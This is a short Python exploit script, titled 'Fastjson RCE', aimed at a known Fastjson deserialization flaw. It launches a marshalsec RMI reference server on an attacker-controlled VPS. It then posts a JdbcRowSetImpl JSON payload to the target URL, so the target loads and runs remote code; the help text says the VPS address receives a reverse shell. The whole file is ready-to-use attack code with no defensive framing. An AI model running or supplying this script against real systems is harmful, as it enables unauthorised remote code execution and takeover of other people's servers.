import argparse
import subprocess
import time
import sys
import requests


def send_paylaod(target, shellIp):
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Content-Type': 'application/json',
        'Accept-Encoding': "gzip, deflate",
        'Connection': "close",
        'Accept': "*/*",
    }
    payload = '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://' + shellIp + ':9999/Exploit", "autoCommit":true}}'
    try:
        send = requests.post(target, headers=headers, data=payload, verify=False)
        print('[+]Payload send successfully')
        time.sleep(3)
        sys.exit(0)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='Fastjson RCE',
                                     description='python3 fastjsonCheck.py -u target')
    parser.add_argument('-u', '--url', type=str, help='漏洞地址')
    parser.add_argument('-s', '--vpsIp', type=str, help='接收反弹shell的地址')
    args = parser.parse_args()
    target = args.url
    shellIp = args.vpsIp
    marshalsecStart = subprocess.Popen(['java', '-cp', 'marshalsec-0.0.3-SNAPSHOT-all.jar',
                                            'marshalsec.jndi.RMIRefServer', 'http://' + shellIp + '/#Exploit', '9999'],
                                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    send_paylaod(target, shellIp)
    # print('out:' + marshalsecStart.stdout.read().decode())
    # print('err:' + marshalsecStart.stderr.read().decode())
    print('[-]Exploit execution failed!!!')
